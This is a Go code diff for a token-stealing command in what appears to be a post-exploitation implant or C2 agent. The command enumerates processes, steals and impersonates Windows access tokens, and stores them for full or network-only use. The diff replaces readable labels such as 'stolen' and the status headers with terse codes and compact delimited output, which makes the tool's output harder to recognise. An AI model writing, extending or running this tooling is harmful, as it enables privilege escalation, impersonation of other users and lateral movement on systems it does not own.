@@ -50,8 +50,6 @@ type StealTokenCommand struct{}
 
 func (c *StealTokenCommand) listTokens() CommandResult {
 	var output strings.Builder
-	output.WriteString(fmt.Sprintf("%-8s %-30s %-25s %s\n", "PID", "Process Name", "User", "Status"))
-	output.WriteString(strings.Repeat("-", 90) + "\n")
 
 	processes, err := getProcessList()
 	if err != nil {
@@ -65,6 +63,15 @@ func (c *StealTokenCommand) listTokens() CommandResult {
 	accessibleCount := 0
 	deniedCount := 0
 	currentPID := uint32(syscall.Getpid())
+
+	// Count processes for table marker
+	procCount := 0
+	for _, proc := range processes {
+		if proc.PID != 0 {
+			procCount++
+		}
+	}
+	output.WriteString(Table(TPSTok, procCount) + "\n")
 
 	for _, proc := range processes {
 		if proc.PID == 0 {
@@ -91,27 +98,28 @@ func (c *StealTokenCommand) listTokens() CommandResult {
 
 					accessibleCount++
 					if uint32(proc.PID) == currentPID {
-						status = "[CURRENT]"
+						status = VCurrent
 					} else {
-						status = "[ACCESSIBLE]"
+						status = VAccess
 					}
 				} else {
 					deniedCount++
-					status = "[ACCESS DENIED]"
-					userInfo = "N/A"
+					status = VDenied
+					userInfo = VNA
 				}
 			}()
 		} else {
 			deniedCount++
-			status = "[PROCESS ACCESS DENIED]"
-			userInfo = "N/A"
+			status = VProcDeny
+			userInfo = VNA
 		}
 
 		output.WriteString(fmt.Sprintf("%-8d %-30s %-25s %s\n",
 			proc.PID, proc.Name, userInfo, status))
 	}
 
-	output.WriteString(fmt.Sprintf("\nSummary: %d accessible, %d denied\n", accessibleCount, deniedCount))
+	// Summary as compact format: accessible,denied
+	output.WriteString(fmt.Sprintf("\n%d,%d\n", accessibleCount, deniedCount))
 
 	return CommandResult{
 		Output:      output.String(),
@@ -200,7 +208,7 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	globalTokenStore.Metadata[name] = TokenMetadata{
 		User:        targetUser,
 		Domain:      targetDomain,
-		Source:      "stolen",
+		Source:      "s",
 		SourcePID:   uint32(pid),
 		ProcessName: processName,
 		StoredAt:    time.Now(),
@@ -328,7 +336,7 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 	globalTokenStore.Metadata[name] = TokenMetadata{
 		User:        targetUser,
 		Domain:      targetDomain,
-		Source:      "stolen",
+		Source:      "s",
 		SourcePID:   uint32(pid),
 		ProcessName: processName,
 		StoredAt:    time.Now(),
@@ -410,56 +418,53 @@ func (c *StealTokenCommand) listStoredTokens() CommandResult {
 		}
 	}
 
-	output.WriteString(fmt.Sprintf("%-15s %-20s %-10s %-25s %-15s %-8s %s\n",
-		"Name", "User", "Source", "Details", "Stored", "Mode", "Status"))
-	output.WriteString(strings.Repeat("-", 110) + "\n")
+	// Table marker for stored tokens
+	output.WriteString(Table(TSTok, len(globalTokenStore.Tokens)) + "\n")
 
 	for name, metadata := range globalTokenStore.Metadata {
 		userInfo := fmt.Sprintf("%s\\%s", metadata.Domain, metadata.User)
 
 		details := ""
-		if metadata.Source == "stolen" {
+		if metadata.Source == "s" { // stolen
 			procName := metadata.ProcessName
 			if len(procName) > 15 {
 				procName = procName[:12] + "..."
 			}
-			details = fmt.Sprintf("%s (PID:%d)", procName, metadata.SourcePID)
-		} else if metadata.Source == "created" {
-			details = fmt.Sprintf("LogonType: %s", metadata.LogonType)
+			details = fmt.Sprintf("%s:%d", procName, metadata.SourcePID)
+		} else if metadata.Source == "c" { // created
+			details = metadata.LogonType
 		}
 
 		storedAt := metadata.StoredAt.Format("15:04:05")
 
-		mode := "Full"
+		// Mode: 0=full, 1=netonly
+		mode := "0"
 		if metadata.NetOnly {
-			mode = "NetOnly"
+			mode = "1"
 		}
 
 		status := ""
 		if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
-			status = "[ACTIVE]"
+			status = VActive
 		} else if globalTokenStore.NetOnlyToken == name {
-			status = "[NETONLY]"
+			status = VNetOnly
 		}
 
-		output.WriteString(fmt.Sprintf("%-15s %-20s %-10s %-25s %-15s %-8s %s\n",
+		output.WriteString(fmt.Sprintf("%-15s %-20s %-2s %-25s %-15s %-2s %s\n",
 			name, userInfo, metadata.Source, details, storedAt, mode, status))
 	}
 
-	output.WriteString(fmt.Sprintf("\nTotal: %d tokens\n", len(globalTokenStore.Tokens)))
-
-	// Show current status
-	output.WriteString("\n=== Current Status ===\n")
+	// Compact status: total,active_token,netonly_token,current_user
 	currentUser, currentDomain := c.getCurrentUserInfo()
-	output.WriteString(fmt.Sprintf("Process User: %s\\%s\n", currentDomain, currentUser))
-
+	activeToken := ""
 	if globalTokenStore.IsImpersonating {
-		output.WriteString(fmt.Sprintf("Impersonating: %s\n", globalTokenStore.ActiveToken))
+		activeToken = globalTokenStore.ActiveToken
 	}
-
-	if globalTokenStore.NetOnlyToken != "" {
-		output.WriteString(fmt.Sprintf("NetOnly Token: %s\n", globalTokenStore.NetOnlyToken))
-	}
+	output.WriteString(fmt.Sprintf("\n%d|%s|%s|%s\\%s\n",
+		len(globalTokenStore.Tokens),
+		activeToken,
+		globalTokenStore.NetOnlyToken,
+		currentDomain, currentUser))
 
 	return CommandResult{
 		Output:      output.String(),
@@ -515,7 +520,7 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 
 func (c *StealTokenCommand) getCurrentTokenInfo() CommandResult {
 	var output strings.Builder
-	output.WriteString("=== Current Token Information ===\n\n")
+	output.WriteString("Token Info:\n")
 
 	// Get current process/thread token info
 	currentUser, currentDomain := c.getCurrentUserInfo()
@@ -620,10 +625,10 @@ func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
 	defer globalTokenStore.mu.RUnlock()
 
 	var output strings.Builder
-	output.WriteString("=== Network-Only Token Status ===\n\n")
+	output.WriteString("NetOnly:\n")
 
 	if globalTokenStore.NetOnlyToken == "" {
-		output.WriteString("No network-only token is currently set\n")
+		output.WriteString(Succ(S0) + "\n")
 	} else {
 		metadata := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]
 		output.WriteString(fmt.Sprintf("Active NetOnly Token: %s\n", globalTokenStore.NetOnlyToken))
@@ -637,7 +642,7 @@ func (c *StealTokenCommand) showNetOnlyStatus() CommandResult {
 	}
 
 	// List all tokens marked as netonly
-	output.WriteString("\n=== Tokens with NetOnly Flag ===\n")
+	output.WriteString("\nNetOnly Tokens:\n")
 	hasNetOnlyTokens := false
 	for name, metadata := range globalTokenStore.Metadata {
 		if metadata.NetOnly {
